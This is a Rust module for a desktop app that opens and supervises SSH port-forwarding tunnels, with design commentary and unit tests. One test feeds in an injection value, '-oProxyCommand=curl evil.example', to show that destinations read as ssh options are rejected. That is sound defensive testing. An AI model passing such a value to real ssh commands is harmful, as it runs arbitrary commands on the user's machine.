//! Hosts reached over an SSH tunnel this application opens and supervises.
//!
//! ## The case this exists for
//!
//! A host on a machine with no public address, no TLS, and no business having
//! either: a homelab box, a work VM behind a bastion, a cloud instance whose
//! only open port is 22. The `remote` connector cannot reach it, and the two
//! ways an operator has today are to expose the host to the internet or to run
//! `ssh -L` in a terminal and paste `http://127.0.0.1:<port>` into "Add a
//! host". Both work; neither is a product.
//!
//! So the tunnel becomes this shell's job:
//!
//! ```text
//! console ──▶ ProxyTransport ──▶ 127.0.0.1:<local> ═══ssh═══▶ remote 127.0.0.1:8080
//! ```
//!
//! The host stays bound to loopback on the far side and is reachable from
//! nowhere else. That is the argument for this connector over `remote`: an
//! OpenCompany host holds a company's credentials, its repositories and its
//! journal, and the smallest number of ways to reach it is the right number.
//!
//! ## Why the system `ssh` and not a library
//!
//! An in-process client (`russh`) would have no dependency and no child to
//! supervise, and would own host-key verification, agent negotiation and
//! config parsing itself — each of them a way to be subtly less safe than the
//! tool the operator already trusts. Shelling out inherits `~/.ssh/config`,
//! `ProxyJump`, the agent, hardware keys and the operator's own `known_hosts`,
//! including its refusal to connect to a host whose key changed.
//!
//! The failure mode of the library is "we accepted a key their own config
//! would have refused", which is not a trade worth making for a Windows
//! dependency that has shipped in the OS since 2018.
//!
//! ## `BatchMode=yes`, and what it costs
//!
//! This child has no terminal. A passphrase or password prompt would therefore
//! block forever with nothing on screen, so prompts are refused outright and
//! the connection fails immediately with what `ssh` printed. The cost is real
//! and worth stating: **the key must be in the agent, or be passphrase-less.**
//! A legible refusal an operator can act on beats a spinner that never stops.
//!
//! See `docs/spec/runtime/connectors.md`.

use std::collections::HashMap;
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};
use std::process::Stdio;
use std::time::{Duration, Instant};

use serde::{Deserialize, Serialize};
use tokio::io::AsyncReadExt;
use tokio::process::{Child, Command};

/// Where the host listens on the far side when nobody says otherwise.
pub const DEFAULT_REMOTE_PORT: u16 = 8080;

/// How long a tunnel is given to start forwarding before it is called failed.
///
/// Generous, because the first hop of a `ProxyJump` chain and an agent
/// confirmation prompt both land inside it.
const READY_TIMEOUT: Duration = Duration::from_secs(20);

/// How often the local end is tried while waiting for that.
const READY_POLL: Duration = Duration::from_millis(150);

/// Where the far end of a tunnel is, as the console describes it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SshTarget {
    /// `user@host`, or a `Host` alias out of `~/.ssh/config`.
    pub destination: String,
    /// The SSH port, when it is not 22.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub port: Option<u16>,
    /// Where the host is listening on the far side.
    #[serde(default = "default_remote_port")]
    pub remote_port: u16,
}

fn default_remote_port() -> u16 {
    DEFAULT_REMOTE_PORT
}

impl SshTarget {
    /// The roster key for this target.
    ///
    /// Derived rather than minted, which is what makes [`SshTunnels::open`]
    /// idempotent: asking twice for the same host answers with the tunnel that
    /// is already up instead of opening a second one beside it. The console
    /// needs that — it reopens every remembered `ssh` connection at launch,
    /// and React's StrictMode does everything twice in development.
    fn key(&self) -> String {
        format!(
            "{}:{}:{}",
            self.destination,
            self.port.unwrap_or(22),
            self.remote_port
        )
    }

    /// Why this target cannot be handed to `ssh`, or `None` when it can.
    ///
    /// The destination becomes an argument to a program whose arguments are
    /// mostly flags, so a value starting with `-` is the one shape that turns
    /// a host name into an option — `-oProxyCommand=…` being the memorable
    /// example. Rejected outright rather than escaped: there is no legitimate
    /// destination of that shape, and this is a text field in a dialog.
    ///
    /// No shell is involved (the child is spawned with an argv, never through
    /// `sh -c`), so nothing else here needs quoting.
    fn problem(&self) -> Option<String> {
        let destination = self.destination.trim();
        if destination.is_empty() {
            return Some(
                "name the machine to connect to, as user@host or an ssh config alias".into(),
            );
        }
        if destination.starts_with('-') {
            return Some(format!(
                "`{destination}` is not a destination — it reads as an ssh option"
            ));
        }
        if destination
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
        {
            return Some(format!(
                "`{destination}` is not a destination — it contains a space"
            ));
        }
        if self.remote_port == 0 {
            return Some("the host's port on the far side cannot be 0".into());
        }
        None
    }
}

/// One tunnel as the console sees it.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SshTunnelInfo {
    /// Stable for a target across launches, and what closing one names.
    pub id: String,
    pub destination: String,
    pub remote_port: u16,
    /// The loopback address the console addresses this host at.
    ///
    /// A different port on every launch, which is why the console persists the
    /// *target* and not this.
    pub base_url: String,
    /// Why it is not forwarding, in `ssh`'s own words.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

struct Tunnel {
    target: SshTarget,
    base_url: String,
    child: Child,
}

/// Every tunnel this application is holding open.
///
/// The sibling of [`crate::local::LocalHosts`] rather than of a remote
/// connection: a tunnel is a resource with a lifetime that this process owns,
/// so it is something to start, supervise and tear down.
#[derive(Default)]
pub struct SshTunnels {
    tunnels: HashMap<String, Tunnel>,
}

impl SshTunnels {
    /// Opens a tunnel to `target`, or hands back the one already open to it.
    ///
    /// Resolves only once the local end actually accepts a connection. An
    /// address returned before then would be handed straight to the proxy,
    /// which would fail its first request and park the row on "unreachable" —
    /// blaming the host for a tunnel that was merely still being built.
    pub async fn open(&mut self, target: SshTarget) -> Result<SshTunnelInfo, String> {
        if let Some(problem) = target.problem() {
            return Err(problem);
        }
        let key = target.key();

        if let Some(existing) = self.tunnels.get_mut(&key) {
            match existing.child.try_wait() {
                // Still forwarding. Answering with it is what makes a relaunch
                // — or StrictMode — cost nothing.
                Ok(None) => {
                    return Ok(info(&key, existing, None));
                }
                // Died since it was opened. Dropped here so the open below is
                // a fresh start rather than a second entry for one host.
                _ => {
                    self.tunnels.remove(&key);
                }
            }
        }

        let local_port = free_loopback_port()?;
        let mut child = spawn_ssh(&target, local_port)?;
        let base_url = format!("http://127.0.0.1:{local_port}");

        match wait_until_forwarding(&mut child, local_port).await {
            Ok(()) => {
                let tunnel = Tunnel {
                    target,
                    base_url,
                    child,
                };
                let entry = self.tunnels.entry(key.clone()).or_insert(tunnel);
                Ok(info(&key, entry, None))
            }
            Err(why) => {
                // Nothing is listening, so there is no tunnel to remember —
                // only a message. A dead row in the roster would be a host the
                // console keeps probing and can never reach.
                let _ = child.kill().await;
                Err(why)
            }
        }
    }

    /// Closes the tunnel to `target` and forgets it.
    ///
    /// Named by the target rather than by the id [`SshTunnelInfo`] carries, so
    /// that the key stays derived in exactly one place. The console persists
    /// the target and not the id — an `ssh` connection restored from
    /// `localStorage` never saw this side's answer — and a second copy of this
    /// derivation over there is a rule two languages have to keep in step.
    ///
    /// A target with no tunnel is not an error: the console closes on removal,
    /// and removal can arrive twice.
    pub async fn close(&mut self, target: &SshTarget) {
        if let Some(mut tunnel) = self.tunnels.remove(&target.key()) {
            let _ = tunnel.child.kill().await;
        }
    }

    /// Every tunnel, saying which of them are still forwarding.
    ///
    /// A tunnel that died — the network moved, the bastion rebooted, someone
    /// killed the session — is a row carrying its reason rather than a missing
    /// entry, for the same reason a local instance that will not start is.
    /// Silence would leave the console reporting a host that is unreachable
    /// with no clue that the path to it is what broke.
    pub fn list(&mut self) -> Vec<SshTunnelInfo> {
        self.tunnels
            .iter_mut()
            .map(|(key, tunnel)| {
                let error = match tunnel.child.try_wait() {
                    Ok(Some(status)) => Some(format!("the ssh tunnel stopped ({status})")),
                    Ok(None) => None,
                    Err(err) => Some(format!("the ssh tunnel could not be checked: {err}")),
                };
                info(key, tunnel, error)
            })
            .collect()
    }
}

fn info(id: &str, tunnel: &Tunnel, error: Option<String>) -> SshTunnelInfo {
    SshTunnelInfo {
        id: id.to_string(),
        destination: tunnel.target.destination.clone(),
        remote_port: tunnel.target.remote_port,
        base_url: tunnel.base_url.clone(),
        error,
    }
}

/// A loopback port nothing is using.
///
/// Asked of the OS rather than picked, by binding port 0 and reading back what
/// it chose. There is a race between the listener closing and `ssh` binding the
/// same port, and it is accepted: the alternative is handing `ssh` a port this
/// process still holds, which fails every time instead of almost never.
/// `ExitOnForwardFailure` turns the rare loss into an immediate, legible error.
fn free_loopback_port() -> Result<u16, String> {
    let listener = TcpListener::bind(SocketAddrV4::new(Ipv4Addr::LOCALHOST, 0))
        .map_err(|err| format!("no local port was available for the tunnel: {err}"))?;
    listener
        .local_addr()
        .map(|addr| addr.port())
        .map_err(|err| format!("no local port was available for the tunnel: {err}"))
}

fn spawn_ssh(target: &SshTarget, local_port: u16) -> Result<Child, String> {
    let mut command = Command::new("ssh");
    command
        // No command on the far side, and no shell: this connection exists to
        // forward a port. `-T` because without a command `ssh` would otherwise
        // still ask for a pty on some servers.
        .arg("-N")
        .arg("-T")
        // The whole point. Without it a forward that cannot be established
        // leaves `ssh` connected and happily forwarding nothing, and the
        // failure surfaces as an unreachable host rather than as a broken
        // tunnel.
        .arg("-o")
        .arg("ExitOnForwardFailure=yes")
        // No terminal here — see the module note.
        .arg("-o")
        .arg("BatchMode=yes")
        // Notices a bastion that went away, rather than holding a dead socket
        // open until the OS gives up on it.
        // A bastion that is simply not there must fail in seconds, not after
        // however long this OS takes to give up on a TCP connect.
        .arg("-o")
        .arg("ConnectTimeout=10")
        .arg("-o")
        .arg("ServerAliveInterval=15")
        .arg("-o")
        .arg("ServerAliveCountMax=3")
        .arg("-L")
        .arg(format!(
            "127.0.0.1:{local_port}:127.0.0.1:{}",
            target.remote_port
        ));
    if let Some(port) = target.port {
        command.arg("-p").arg(port.to_string());
    }
    command
        .arg(&target.destination)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        // A tunnel outliving the shell that opened it would be a process
        // nothing lists and nobody can stop from the application.
        .kill_on_drop(true);

    command.spawn().map_err(|err| {
        if err.kind() == std::io::ErrorKind::NotFound {
            "this computer has no `ssh` command to open a tunnel with".to_string()
        } else {
            format!("the ssh tunnel could not be started: {err}")
        }
    })
}

/// Waits for the local end to accept a connection, or for `ssh` to explain why
/// it never will.
///
/// Both halves are needed. Polling alone would wait the full timeout on a host
/// key mismatch that `ssh` reported in the first hundred milliseconds; watching
/// the child alone would never notice a tunnel that came up fine.
async fn wait_until_forwarding(child: &mut Child, local_port: u16) -> Result<(), String> {
    let deadline = Instant::now() + READY_TIMEOUT;
    loop {
        if let Ok(Some(_)) = child.try_wait() {
            return Err(ssh_said(child).await);
        }
        if tokio::net::TcpStream::connect((Ipv4Addr::LOCALHOST, local_port))
            .await
            .is_ok()
        {
            return Ok(());
        }
        if Instant::now() >= deadline {
            return Err(format!(
                "the ssh tunnel did not start forwarding within {}s",
                READY_TIMEOUT.as_secs()
            ));
        }
        tokio::time::sleep(READY_POLL).await;
    }
}

/// What `ssh` printed, turned into something a dialog can show.
///
/// Its own words rather than a summary of them: "Host key verification failed"
/// and "Permission denied (publickey)" are the two most likely outcomes here,
/// and both are things the operator has to go and fix in a specific way that
/// only `ssh` knows the shape of.
async fn ssh_said(child: &mut Child) -> String {
    let mut said = String::new();
    if let Some(mut stderr) = child.stderr.take() {
        let _ = stderr.read_to_string(&mut said).await;
    }
    let trimmed = said.trim();
    if trimmed.is_empty() {
        "the ssh tunnel closed without saying why".to_string()
    } else {
        // The last line is the verdict; the ones above it are usually
        // `debug`-ish noise from the operator's own config.
        trimmed.lines().last().unwrap_or(trimmed).trim().to_string()
    }
}

#[cfg(test)]
mod test {
    use super::*;

    fn target(destination: &str) -> SshTarget {
        SshTarget {
            destination: destination.into(),
            port: None,
            remote_port: 8080,
        }
    }

    #[test]
    fn one_target_is_one_tunnel() {
        // The roster key is what makes `open` idempotent, and the console
        // depends on that: it reopens every remembered ssh host at launch, and
        // StrictMode calls everything twice.
        assert_eq!(target("vps").key(), target("vps").key());
    }

    #[test]
    fn a_different_port_on_the_far_side_is_a_different_tunnel() {
        let mut other = target("vps");
        other.remote_port = 9090;
        assert_ne!(target("vps").key(), other.key());
    }

    #[test]
    fn refuses_a_destination_that_reads_as_an_option() {
        // The one shape that turns a host name into an ssh flag. There is no
        // legitimate destination like it, and this is a text field in a dialog.
        assert!(
            target("-oProxyCommand=curl evil.example")
                .problem()
                .is_some()
        );
        assert!(target("").problem().is_some());
        assert!(target("user@host with space").problem().is_some());
    }

    #[test]
    fn accepts_what_an_operator_actually_types() {
        assert!(target("vps").problem().is_none());
        assert!(target("deploy@10.0.0.4").problem().is_none());
        assert!(target("bastion.example.com").problem().is_none());
    }

    #[test]
    fn refuses_a_port_nothing_can_listen_on() {
        let mut zero = target("vps");
        zero.remote_port = 0;
        assert!(zero.problem().is_some());
    }

    #[test]
    fn the_far_side_defaults_to_the_port_a_host_serves() {
        let parsed: SshTarget = serde_json::from_str(r#"{"destination":"vps"}"#).unwrap();
        assert_eq!(parsed.remote_port, DEFAULT_REMOTE_PORT);
    }

    #[test]
    fn reads_what_the_console_sends() {
        let parsed: SshTarget =
            serde_json::from_str(r#"{"destination":"vps","port":2222,"remotePort":9090}"#).unwrap();
        assert_eq!(parsed.port, Some(2222));
        assert_eq!(parsed.remote_port, 9090);
    }

    #[tokio::test]
    async fn keeps_no_row_for_a_tunnel_that_never_opened() {
        // A destination in the reserved `.invalid` TLD, so this fails at
        // resolution rather than after a connect timeout — and finishes at all,
        // which is what `BatchMode=yes` buys: no password prompt is waiting for
        // a window that does not exist.
        //
        // The assertion that matters is the second. A failed open must leave
        // *nothing* behind: a roster row for a tunnel that is not forwarding is
        // a host the console would probe forever and never reach.
        let mut tunnels = SshTunnels::default();
        let unreachable = target("opencompany-desktop-test.invalid");

        assert!(tunnels.open(unreachable).await.is_err());
        assert!(tunnels.list().is_empty());
    }
}
